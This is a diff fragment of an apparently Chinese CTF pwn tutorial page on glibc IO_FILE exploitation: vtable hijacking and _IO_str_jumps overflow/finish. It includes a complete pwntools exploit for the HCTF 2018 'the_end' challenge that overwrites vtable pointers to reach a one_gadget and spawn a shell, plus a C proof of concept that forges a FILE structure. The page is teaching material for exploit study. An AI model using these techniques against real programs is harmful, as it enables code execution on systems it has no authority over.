 <p>伪造 vtable 劫持程序流程<br>由于我们调用io函数时，其最终会指向vtable的函数。所以我们可以通过改变vtable对应项或改变vtable指针，使其指向可利用位置，再在相应位置填写目标函数。</p>
 <p>在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。换言之，2.23及以后，只能通过修改vtable指针再进行利用了。</p>
 <p><strong>举例2018 HCTF the_end</strong></p>
-<p class='item-img' data-src='https://s2.loli.net/2023/11/21/aLy6HXt5ogBscfF.png'><img src="https://s2.loli.net/2023/11/21/aLy6HXt5ogBscfF.png" alt="image.png"></p>
-<p>由于<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=sleep%E5%87%BD%E6%95%B0&amp;spm=1001.2101.3001.7020">sleep函数</a>地址泄露，所以可以获得基址，于是得到偏移后虚表指针地址，one_gadget地址。</p>
+<p class='item-img' data-src='https://s2.loli.net/2023/11/21/aLy6HXt5ogBscfF.png'><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s2.loli.net/2023/11/21/aLy6HXt5ogBscfF.png"
+                      alt="image.png"
+                ><figcaption>image.png</figcaption></figure></p>
+<p>由于<a class="link"  target="_blank" rel="noopener"  href="https://so.csdn.net/so/search?q=sleep%E5%87%BD%E6%95%B0&amp;spm=1001.2101.3001.7020" >sleep函数<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>地址泄露，所以可以获得基址，于是得到偏移后虚表指针地址，one_gadget地址。</p>
 <p>题目拥有5字节任意地址修改能力。</p>
 <p>本题我们利用的是：</p>
 <ul>
@@ -349,7 +681,7 @@
 <p>setbuf在虚表0x58偏移处。</p>
 <p>所以我们覆盖虚表指针的数值为 伪造处地址-0x58</p>
 <p>exp：</p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level = <span class="hljs-string">"debug"</span>,arch = <span class="hljs-string">"amd64"</span>)<br>filename=<span class="hljs-string">'./the_end.the_end'</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    local = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> local:<br>        p = process([<span class="hljs-string">'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so'</span>, filename], env=&#123;<span class="hljs-string">"LD_PRELOAD"</span>:<span class="hljs-string">'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'</span>&#125;)<br>        <span class="hljs-comment"># p = process(filename)</span><br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">"node4.buuoj.cn"</span>, <span class="hljs-number">25550</span>)<br>    elf = ELF(filename)<br>    <span class="hljs-comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br>    <span class="hljs-comment"># libc = ELF("/mnt/hgfs/PWN/study_path/pwn_rm/pwn145_180/libc/64bit/libc-2.23.so")</span><br>    <span class="hljs-comment"># libc = ELF("/mnt/e/CTF/PWN/varctf/buuctf/exer/4/libc-2.27.so")</span><br>    libc = ELF(<span class="hljs-string">"/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sa      = <span class="hljs-keyword">lambda</span> x,data             :p.sendafter(x, data)<br>sla     = <span class="hljs-keyword">lambda</span> x,data             :p.sendlineafter(x, data)<br>r       = <span class="hljs-keyword">lambda</span> n                  :p.recv(n)<br>rl      = <span class="hljs-keyword">lambda</span> n                  :p.recvline(n)<br>ru      = <span class="hljs-keyword">lambda</span> x                  :p.recvuntil(x, drop=<span class="hljs-literal">True</span>)<br>r       = <span class="hljs-keyword">lambda</span> x                  :p.recv(x)<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(p.recvuntil(<span class="hljs-string">b'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">'&#123;&#125; = &#123;:#x&#125;'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg      = <span class="hljs-keyword">lambda</span> address,data       :log.success(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">addr</span>):<br>    gdb.attach(sh,<span class="hljs-string">'b *0x&#123;&#125;\nc\n'</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    gdb.attach(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">addr1,byte</span>):<br>    s(p64(addr1))<br>    s(p8(byte))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    ru(<span class="hljs-string">"here is a gift "</span>)<br>    sleep = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">", "</span>),<span class="hljs-number">16</span>)<br>    leak(<span class="hljs-string">"sleep"</span>,sleep)<br>    libc_addr = sleep - libc.sym[<span class="hljs-string">"sleep"</span>]<br>    lg(<span class="hljs-string">"libc_base"</span>,libc_addr)<br><br>    one_gadget = libc_addr + <span class="hljs-number">0xf1247</span><br>    stdout_vtable_ptr = libc_addr + libc.sym[<span class="hljs-string">'_IO_2_1_stdout_'</span>]+<span class="hljs-number">0xd8</span><br>    stderr_vtable_ptr = libc_addr + libc.sym[<span class="hljs-string">'_IO_2_1_stderr_'</span>]+<span class="hljs-number">0xd8</span><br>    lg(<span class="hljs-string">"one_gadget"</span>,one_gadget)<br>    lg(<span class="hljs-string">"stdout_vtable_ptr"</span>,stdout_vtable_ptr)<br>    lg(<span class="hljs-string">"stderr_vtable_ptr"</span>,stderr_vtable_ptr)<br><br>    fake_vtable_addr = stderr_vtable_ptr - <span class="hljs-number">0x58</span> <span class="hljs-comment"># fake虚表的位置</span><br>    lg(<span class="hljs-string">"fake_vtable_addr"</span>,fake_vtable_addr)<br>    change(stdout_vtable_ptr,(fake_vtable_addr &amp; <span class="hljs-number">0xff</span>))<br>    change(stdout_vtable_ptr+<span class="hljs-number">1</span>,((fake_vtable_addr &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)) <span class="hljs-comment">#劫持stdout结构体的虚表指针指向fake table的位置(_IO_2_1_stderr_+128)</span><br><br>    change(stderr_vtable_ptr,(one_gadget &amp; <span class="hljs-number">0xff</span>))<br>    change(stderr_vtable_ptr+<span class="hljs-number">1</span>,((one_gadget &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>))<br>    change(stderr_vtable_ptr+<span class="hljs-number">2</span>,((one_gadget &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>))<br><br>    sl(<span class="hljs-string">"exec /bin/sh 1&gt;&amp;0"</span>)<br><br>    p.interactive()<br><br><br><br>connect()<br>pwn()<br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226 execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level = <span class="hljs-string">"debug"</span>,arch = <span class="hljs-string">"amd64"</span>)<br>filename=<span class="hljs-string">'./the_end.the_end'</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    local = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> local:<br>        p = process([<span class="hljs-string">'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so'</span>, filename], env=&#123;<span class="hljs-string">"LD_PRELOAD"</span>:<span class="hljs-string">'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'</span>&#125;)<br>        <span class="hljs-comment"># p = process(filename)</span><br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">"node4.buuoj.cn"</span>, <span class="hljs-number">25550</span>)<br>    elf = ELF(filename)<br>    <span class="hljs-comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br>    <span class="hljs-comment"># libc = ELF("/mnt/hgfs/PWN/study_path/pwn_rm/pwn145_180/libc/64bit/libc-2.23.so")</span><br>    <span class="hljs-comment"># libc = ELF("/mnt/e/CTF/PWN/varctf/buuctf/exer/4/libc-2.27.so")</span><br>    libc = ELF(<span class="hljs-string">"/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sa      = <span class="hljs-keyword">lambda</span> x,data             :p.sendafter(x, data)<br>sla     = <span class="hljs-keyword">lambda</span> x,data             :p.sendlineafter(x, data)<br>r       = <span class="hljs-keyword">lambda</span> n                  :p.recv(n)<br>rl      = <span class="hljs-keyword">lambda</span> n                  :p.recvline(n)<br>ru      = <span class="hljs-keyword">lambda</span> x                  :p.recvuntil(x, drop=<span class="hljs-literal">True</span>)<br>r       = <span class="hljs-keyword">lambda</span> x                  :p.recv(x)<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(p.recvuntil(<span class="hljs-string">b'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">'&#123;&#125; = &#123;:#x&#125;'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg      = <span class="hljs-keyword">lambda</span> address,data       :log.success(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">addr</span>):<br>    gdb.attach(sh,<span class="hljs-string">'b *0x&#123;&#125;\nc\n'</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    gdb.attach(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">addr1,byte</span>):<br>    s(p64(addr1))<br>    s(p8(byte))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    ru(<span class="hljs-string">"here is a gift "</span>)<br>    sleep = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">", "</span>),<span class="hljs-number">16</span>)<br>    leak(<span class="hljs-string">"sleep"</span>,sleep)<br>    libc_addr = sleep - libc.sym[<span class="hljs-string">"sleep"</span>]<br>    lg(<span class="hljs-string">"libc_base"</span>,libc_addr)<br><br>    one_gadget = libc_addr + <span class="hljs-number">0xf1247</span><br>    stdout_vtable_ptr = libc_addr + libc.sym[<span class="hljs-string">'_IO_2_1_stdout_'</span>]+<span class="hljs-number">0xd8</span><br>    stderr_vtable_ptr = libc_addr + libc.sym[<span class="hljs-string">'_IO_2_1_stderr_'</span>]+<span class="hljs-number">0xd8</span><br>    lg(<span class="hljs-string">"one_gadget"</span>,one_gadget)<br>    lg(<span class="hljs-string">"stdout_vtable_ptr"</span>,stdout_vtable_ptr)<br>    lg(<span class="hljs-string">"stderr_vtable_ptr"</span>,stderr_vtable_ptr)<br><br>    fake_vtable_addr = stderr_vtable_ptr - <span class="hljs-number">0x58</span> <span class="hljs-comment"># fake虚表的位置</span><br>    lg(<span class="hljs-string">"fake_vtable_addr"</span>,fake_vtable_addr)<br>    change(stdout_vtable_ptr,(fake_vtable_addr &amp; <span class="hljs-number">0xff</span>))<br>    change(stdout_vtable_ptr+<span class="hljs-number">1</span>,((fake_vtable_addr &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)) <span class="hljs-comment">#劫持stdout结构体的虚表指针指向fake table的位置(_IO_2_1_stderr_+128)</span><br><br>    change(stderr_vtable_ptr,(one_gadget &amp; <span class="hljs-number">0xff</span>))<br>    change(stderr_vtable_ptr+<span class="hljs-number">1</span>,((one_gadget &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>))<br>    change(stderr_vtable_ptr+<span class="hljs-number">2</span>,((one_gadget &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>))<br><br>    sl(<span class="hljs-string">"exec /bin/sh 1&gt;&amp;0"</span>)<br><br>    p.interactive()<br><br><br><br>connect()<br>pwn()<br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226 execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>stdout_vtable_ptr -&gt; stderr_vtable_ptr - 0x58 (实际上是stderr_vtable_ptr虚表的位置)</p>
 <p>stderr_vtable_ptr -&gt;  one_gadget </p>
@@ -375,13 +707,13 @@
 </li>
 </ol>
 <p>ctfwiki给的示例很简单，具体利用有house of  orange，后面再说。</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mode_offset 0xc0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writeptr_offset 0x28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writebase_offset 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vtable_offset 0xd8</span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *list_all_ptr;<br> <br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br> <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+mode_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writeptr_offset)=<span class="hljs-number">0x1</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writebase_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+vtable_offset)=((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>+<span class="hljs-number">24</span>)=<span class="hljs-number">0x41414141</span>;<br>    list_all_ptr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)_IO_list_all;<br> <br>    list_all_ptr[<span class="hljs-number">0</span>]=ptr;<br> <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></tbody></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mode_offset 0xc0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writeptr_offset 0x28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writebase_offset 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vtable_offset 0xd8</span><br> <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *list_all_ptr;<br> <br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br> <br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+mode_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writeptr_offset)=<span class="hljs-number">0x1</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writebase_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+vtable_offset)=((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>+<span class="hljs-number">24</span>)=<span class="hljs-number">0x41414141</span>;<br>    list_all_ptr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)_IO_list_all;<br> <br>    list_all_ptr[<span class="hljs-number">0</span>]=ptr;<br> <br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></tbody></table></figure></div>
 
 <p>glibc 2.24 下 IO_FILE 的利用</p>
 <blockquote>
 <p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p>
 </blockquote>
-<h4 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h4><p>由于<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=fwrite&amp;spm=1001.2101.3001.7020">fwrite</a>等函数会最终调用io函数，其缓冲区的初地址有buf_base决定，所以如果修改buf_base与buf_end就可以实现任意地址输入。</p>
+<h4 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h4><p>由于<a class="link"  target="_blank" rel="noopener"  href="https://so.csdn.net/so/search?q=fwrite&amp;spm=1001.2101.3001.7020" >fwrite<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>等函数会最终调用io函数，其缓冲区的初地址有buf_base决定，所以如果修改buf_base与buf_end就可以实现任意地址输入。</p>
 <h4 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -> overflow"></a>_IO_str_jumps -&gt; overflow</h4><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个 <code>vtable</code> 不在 check 范围之内。如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。</p>
 <p> 构造条件：</p>
 <blockquote>
@@ -394,93 +726,380 @@
 <li>fp+0xe0指向system地址</li>
 </ol>
 </blockquote>
-<h4 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps -> finish"></a><strong>_IO_str_jumps -&gt; finish</strong></h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"> 条件：<br><br>_IO_buf_base 不为空<br>_flags &amp; _IO_USER_BUF(<span class="hljs-number">0x01</span>) 为假<br>构造：<br><br>_flags = (binsh_in_libc + <span class="hljs-number">0x10</span>) &amp; ~<span class="hljs-number">1</span><br><br>_IO_buf_base = binsh_addr<br><br>_freeres_list = <span class="hljs-number">0x2</span><br><br>_freeres_buf = <span class="hljs-number">0x3</span><br><br>_mode = <span class="hljs-number">-1</span><br><br>vtable = _IO_str_finish - <span class="hljs-number">0x18</span><br><br>fp+<span class="hljs-number">0xe8</span> -&gt; system_addr<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps -> finish"></a><strong>_IO_str_jumps -&gt; finish</strong></h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"> 条件：<br><br>_IO_buf_base 不为空<br>_flags &amp; _IO_USER_BUF(<span class="hljs-number">0x01</span>) 为假<br>构造：<br><br>_flags = (binsh_in_libc + <span class="hljs-number">0x10</span>) &amp; ~<span class="hljs-number">1</span><br><br>_IO_buf_base = binsh_addr<br><br>_freeres_list = <span class="hljs-number">0x2</span><br><br>_freeres_buf = <span class="hljs-number">0x3</span><br><br>_mode = <span class="hljs-number">-1</span><br><br>vtable = _IO_str_finish - <span class="hljs-number">0x18</span><br><br>fp+<span class="hljs-number">0xe8</span> -&gt; 